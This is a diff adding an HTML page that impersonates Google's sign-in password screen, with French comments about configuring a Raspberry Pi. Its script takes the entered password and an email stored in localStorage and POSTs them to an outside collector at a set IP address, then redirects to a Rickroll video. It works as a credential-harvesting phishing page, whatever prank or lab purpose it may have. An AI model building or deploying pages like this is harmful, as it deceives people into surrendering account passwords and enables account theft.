@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Google account</title>
+    <link rel="stylesheet" href="./Gmail_page.css">
+</head>
+<body>
+<div class="container">
+  <div class="top-content">
+    <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="Google">
+    <h2>Sign in</h2>
+    <p class="heading">Use your Google Account</p>
+  </div>
+  
+  <div class="inputs">
+    <input type="password" name="password" id="password" class="input" required>
+    <label for="password" class="input-label">Password</label>
+  </div>
+  
+  <a href="#" class="link-btn">Forgot Password?</a>
+  <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
+  <a href="#" class="link-btn">Learn More</a>
+  
+  <div class="btn-group">
+    <button class="create-btn" id="btn-back">Back</button>
+    <button class="next-btn" id="btn-signin">Sign in</button>
+  </div>
+</div>
+
+<script>
+  document.getElementById('btn-back').addEventListener('click', function() {
+    window.location.href = 'index.html';
+  });
+
+  document.getElementById('btn-signin').addEventListener('click', async function() {
+    const passwordInput = document.getElementById('password');
+    const passwordValue = passwordInput.value;
+    const emailValue = localStorage.getItem('userEmail');
+
+    if (!emailValue) {
+        alert("Email not found. Please go back and sign in again.");
+        window.location.href = 'index.html';
+        return;
+    }
+
+    if (!passwordValue) {
+        alert("Please enter a password");
+        return;
+    }
+
+    // --- CONFIGURATION ---
+    // Remplacez par l'adresse IP de votre Raspberry Pi
+    const PI_IP = "192.168.1.157"; 
+    const URL = `http://${PI_IP}:5000/data`;
+    // ---------------------
+
+    this.innerText = "Loading...";
+    this.disabled = true;
+
+    try {
+        const response = await fetch(URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ 
+                email: emailValue,
+                password: passwordValue,
+                timestamp: new Date().toISOString()
+            })
+        });
+
+        if (response.ok) {
+            // Redirection après succès vers votre page de confirmation
+            window.location.href = 'https://m.youtube.com/watch?v=dQw4w9WgXcQ';
+        } else {
+            alert("Server error: " + response.status);
+            this.innerText = "Sign in";
+            this.disabled = false;
+        }
+    } catch (error) {
+        console.error("Connection error:", error);
+        alert("A strange error occurred. Please try again later.");
+        this.innerText = "Sign in";
+        this.disabled = false;
+    }
+  });
+</script>
+</body>
+</html>
